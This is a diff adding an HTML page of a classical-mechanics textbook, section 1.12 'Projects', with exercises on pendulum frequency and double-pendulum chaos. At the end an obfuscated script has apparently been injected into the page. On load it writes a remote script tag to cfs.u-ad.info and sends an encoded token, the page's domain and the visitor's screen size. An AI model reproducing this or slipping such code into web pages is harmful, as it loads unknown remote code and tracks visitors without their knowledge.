@@ -1,0 +1,145 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-18.html">previous</a></span><span>, <a href="book-Z-H-20.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_1.12"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_1.12">1.12&nbsp;&nbsp;Projects</a></h2>
+<p>
+</p>
+<p><a name="%_thm_1.38"></a>
+<b>Exercise 1.38.</b>&nbsp;&nbsp;<strong>A numerical investigation</strong><br>
+Consider a pendulum: a mass <em>m</em> supported on a massless rod of length&nbsp;<em>l</em>
+in a uniform gravitational field.  A Lagrangian for the pendulum
+is
+</p>
+<div align=left><img src="chap1-Z-G-280.gif" border="0"></div>
+<p>
+For the pendulum, the period of the motion depends on the amplitude.
+We wish to find trajectories of the pendulum with a given frequency.
+Three methods of doing this present themselves: (1) solution by the
+principle of least action, (2) numerical integration of Lagrange's
+equation, and (3) analytic solution (which requires some exposure to
+elliptic functions).  We will carry out all three and compare the
+solution trajectories.</p>
+<p>
+Consider the parameters <em>m</em>  =  1 kg, <em>l</em>  =  1 m,
+<em>g</em> = 9.8 m s<sup><tt>-</tt>2</sup>.  The frequency of small-amplitude oscillations is
+<img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub>  =  (<em>g</em>/<em>l</em>)<sup>1/2</sup>.  Let's find the nontrivial solution that has the
+frequency <img src="chap1-Z-G-D-23.gif" border="0"><sub>1</sub>  =  (4/5) <img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub>.</p>
+<p>
+<strong>a</strong>.&nbsp;&nbsp;The angle is periodic in time, so a Fourier series
+representation is appropriate.  We can choose the origin of time so
+that a zero crossing of the angle is at time zero.  Since the
+potential is even in the angle, the angle is an odd function of time.
+Thus we need only a sine series.  Since the angle returns to zero
+after one-half period, the angle is an odd function of time about the
+midpoint.  Thus only odd terms of the series are present:
+</p>
+<div align=left><img src="chap1-Z-G-281.gif" border="0"></div>
+<p>
+The amplitude of the trajectory is <em>A</em>  =  <img src="chap1-Z-G-D-19.gif" border="0"><sub>max</sub>  =  sum<sub><em>n</em>=1</sub><sup>infty</sup> ( <tt>-</tt> 1)<sup><em>n</em>+1</sup> <em>A</em><sub><em>n</em></sub>.</p>
+<p>
+Find approximations to the first few coefficients <em>A</em><sub><em>n</em></sub> by minimizing
+the action.  You will have to write a program similar to the <tt>find-path</tt> procedure in section&nbsp;<a href="book-Z-H-11.html#%_sec_1.4">1.4</a>.
+Watch out: there is more than one trajectory that minimizes the
+action.</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;Write a program to numerically integrate Lagrange's equations for
+the trajectories of the pendulum.  The trouble with using numerical
+integration to solve this problem is that we do not know how the
+frequency of the motion depends on the initial conditions.  So we have
+to guess, and then gradually improve our guess.  Define a function
+<img src="chap1-Z-G-D-57.gif" border="0">(<img src="chap1-Z-G-D-20.gif" border="0">) that numerically computes the frequency of the
+motion as a function of the initial angular velocity (with <img src="chap1-Z-G-D-19.gif" border="0">  = 
+0).  Find the trajectory by solving <img src="chap1-Z-G-D-57.gif" border="0">(<img src="chap1-Z-G-D-20.gif" border="0">)  =  <img src="chap1-Z-G-D-23.gif" border="0">
+for the initial angular velocity of the desired trajectory.  Methods
+of solving this equation include successive bisection, minimizing the
+squared residual, etc. -- choose one.</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;Now let's formulate the analytic solution for the frequency as a
+function of amplitude.  The period of the motion is simply
+</p>
+<div align=left><img src="chap1-Z-G-282.gif" border="0"></div>
+<p>
+Using the energy, solve for <img src="chap1-Z-G-D-20.gif" border="0"> in terms of the amplitude
+<em>A</em> and <img src="chap1-Z-G-D-19.gif" border="0"> to write the required integral explicitly.  This
+integral can be written in terms of elliptic functions, but in a sense
+this does not solve the problem -- we still have to compute the
+elliptic functions.  Let's avoid this excursion into elliptic
+functions and just do the integral numerically using the procedure
+<tt>definite-integral</tt>.  We still have the problem that we can
+specify the amplitude <em>A</em> and get the frequency; to solve our
+problem we need to solve the inverse problem, but that can be done as
+in part&nbsp;<strong>b</strong>.
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_1.39"></a>
+<b>Exercise 1.39.</b>&nbsp;&nbsp;<strong>Double pendulum behavior</strong><br>
+<a name="%_idx_1052"></a>Consider the ideal double
+pendulum shown in figure&nbsp;<a href="#FIGURE_1.11">1.11</a>.</p>
+<p>
+
+<strong>a</strong>.&nbsp;&nbsp;Formulate a Lagrangian to describe the dynamics.
+Derive the equations of motion in terms of the given angles
+<img src="chap1-Z-G-D-19.gif" border="0"><sub>1</sub> and <img src="chap1-Z-G-D-19.gif" border="0"><sub>2</sub>.  Put the equations into a form appropriate
+for numerical integration. Assume the following system parameters:
+<a name="EQUATION_1.236"></a></p>
+<div align=left><img src="chap1-Z-G-283.gif" border="0"></div>
+<p></p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;Prepare graphs showing the behavior of each angle as a function of
+time when the system is started with the following initial conditions:
+<a name="EQUATION_1.237"></a></p>
+<div align=left><img src="chap1-Z-G-284.gif" border="0"></div>
+<p>
+Make the graphs extend to 50 seconds.  Save the state points at
+.125-second intervals in a list.</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;Make a graph of the behavior of the energy of your system as a
+function of time.  The energy should be conserved.  How good is the
+conservation you obtained?</p>
+<p>
+<strong>d</strong>.&nbsp;&nbsp;Repeat the experiment of part&nbsp;<strong>b</strong> with the <em>m</em><sub>2</sub> bob 10<sup><tt>-</tt>10</sup>
+m higher than before.  Form the list of squared differences of
+the distances between the <em>m</em><sub>2</sub> bobs in the two experiments, and plot
+the log of that against time.  What do you see?</p>
+<p>
+<strong>e</strong>.&nbsp;&nbsp;Repeat the previous comparison, but this time with the initial
+conditions:
+<a name="EQUATION_1.238"></a></p>
+<div align=left><img src="chap1-Z-G-285.gif" border="0"></div>
+<p>
+What do you see here?
+</p>
+
+<p></p>
+<p>
+<a name="FIGURE_1.11"></a></p>
+<div align=left><img src="chap1-Z-G-286.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p>
+
+
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-18.html">previous</a></span><span>, <a href="book-Z-H-20.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0roAalEHAKHkVrVIF4ho9CaPBITopzm10P9qZyVHMtgeWBvBxJuHuMxL3svbdOcLnBlLxFxybENYUxmnqgYQLP9PYiIBBFByZmSkW5ATzMt%2f%2fFBrWR1MWInfOL36J0iUfxJDSrYNXW6Ovv6XisoxJ8vDDZuDym%2fk%2feBRGOU81ybodQvYWC7ttqVnyssWp2LwFwqaXgHAaFFK%2bs1lbaS9nIJ%2fSCw4E70r%2bd6Y7xL9LAJjJHWVAN7bDraMy5TyJVjHJoZ6wYhvzpX2kTxZdKO199hXVfM82mPZsbCMHV3T1pyC0lJdsjopWXOzD0DraCR%2bJ7QWcKIHj8VXY4pzxjiUYUwPH0asCdXIX%2bJkTApUPj4lm3u8TH8GAY5FM%2bIvYkMeYza2XGzPprTKmzvyB8TqckDWzjFl4VzDXWIAn4iaTDTFmj61afPBGfaW%2fr4r9WO8AjNPDaPz7AFAhT6VCJSyjw");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
